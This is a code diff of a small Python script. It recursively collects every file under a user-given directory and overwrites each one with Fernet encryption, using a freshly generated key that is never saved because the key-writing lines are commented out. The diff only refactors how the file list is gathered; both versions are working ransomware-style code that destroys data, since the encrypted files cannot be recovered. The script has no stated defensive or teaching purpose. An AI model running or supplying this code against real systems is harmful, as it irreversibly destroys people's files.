@@ -1,59 +1,22 @@
-import os
-import glob
 from cryptography.fernet import Fernet
+import os
 import sys
+from os import path
 
-all_dir = []
-all_s_dir = []
-all_s_file = []
-allsd = {}
 t_dir = input()
 
-
-all_s_dirs = []
-target_files = []
-
+temp_files = []
+files = []
 key = Fernet.generate_key()
-  
-# string the key in a file
-#with open('filekey.key', 'wb') as filekey:
-   #filekey.write(key)
 
-def listdirs(rootdir):
-    for it in os.scandir(rootdir):
-        if it.is_dir():
-            listdirs(it)
-            all_dir.append(it.path)
+for i in os.walk(t_dir):
+    temp_files.append(list(i))
 
+for i in temp_files:
+    for j in i[-1]:
+        files.append(i[0]+'/'+j)
 
-def listdirs(t_dir):
-    for it in os.scandir(t_dir):
-        if it.is_dir():
-            listdirs(it)
-            all_s_dir.append(it.path)
- 
-for it in os.scandir(t_dir):
-    if it.is_file():
-        all_s_file.append(it.path)
-
-listdirs(t_dir)
-
-for i in all_s_dir:
-    all_s_dirs.append(i.split('sync')[-1])
-all_s_dirs.append(t_dir.split('sync')[-1])
-
-for i in all_s_dirs:
-    allsd[i]=glob.glob(f"{i}/*.*")
-allsd = list(allsd.values())
-for i in allsd:
-    for j in i:
-        target_files.append(j)
-
-all_dir = 0
-all_s_dir = 0
-all_s_file = 0
-allsd = 0
-all_s_dirs = 0
+temp_files = []
 
 
 def enc_file(tfile,ekey):
@@ -75,5 +38,5 @@ def enc_file(tfile,ekey):
     with open(tfile, 'wb') as encrypted_file:
         encrypted_file.write(encrypted)
 
-for i in target_files:
+for i in files:
     enc_file(i,key)
